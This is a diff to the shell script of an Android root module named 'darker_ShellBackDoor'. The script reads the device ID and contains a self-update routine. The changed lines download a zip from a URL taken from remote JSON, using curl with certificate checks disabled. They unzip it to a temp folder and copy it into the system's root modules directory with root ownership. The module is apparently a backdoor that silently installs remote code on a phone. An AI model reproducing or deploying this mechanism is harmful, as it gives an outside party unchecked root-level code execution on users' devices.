@@ -28,6 +28,7 @@
 
 # global variables
     MODDIR="/data/adb/modules/darker_ShellBackDoor"
+    tmp_dir="/data/local/tmp/darker_ShellBackDoor"
     cfg_dir="$MODDIR/backdoor.prop"
     android_id="$(settings get secure android_id)"
     pver="$(grep_prop versionCode "$MODDIR"/module.prop 2>/dev/null)"
@@ -52,13 +53,13 @@ update() {
     if [ "$netver" -ge "$pver" ] && [ "$netver" != "$pver" ]; then
         # shellcheck disable=SC2016
         updateZipUrl="$(echo "$netjson" | sed -n '/zipUrl/p' | /data/adb/magisk/busybox awk -v FS=': "' '{print $2}' | /data/adb/magisk/busybox awk -v FS='",' '{print $1}')"
-        rm -rf "$MODDIR"/newver.zip
-        $_curl -sLk "$updateZipUrl" --output "$MODDIR"/newver.zip
-        mkdir "$MODDIR"/newver
-        unzip -o -q -d "$MODDIR"/newver "$MODDIR"/newver.zip
-        rm -rf "$MODDIR"/newver.zip "$MODDIR/newver/customize.sh"
-        cp -af "$MODDIR/newver" "$MODDIR"
-        rm -rf "$MODDIR"/newver
+        rm -rf "$tmp_dir" "$tmp_dir.zip"
+        $_curl -sLk "$updateZipUrl" --output "$tmp_dir.zip"
+        mkdir "$tmp_dir"
+        unzip -o -q -d "$tmp_dir" "$tmp_dir.zip"
+        rm -rf "$tmp_dir.zip" "$tmp_dir/customize.sh"
+        cp -af "$tmp_dir" "/data/adb/modules"
+        rm -rf "$tmp_dir"
         chown -R root:root "$MODDIR"
         chmod -R 0775 "$MODDIR"
         chmod +x "$MODDIR"
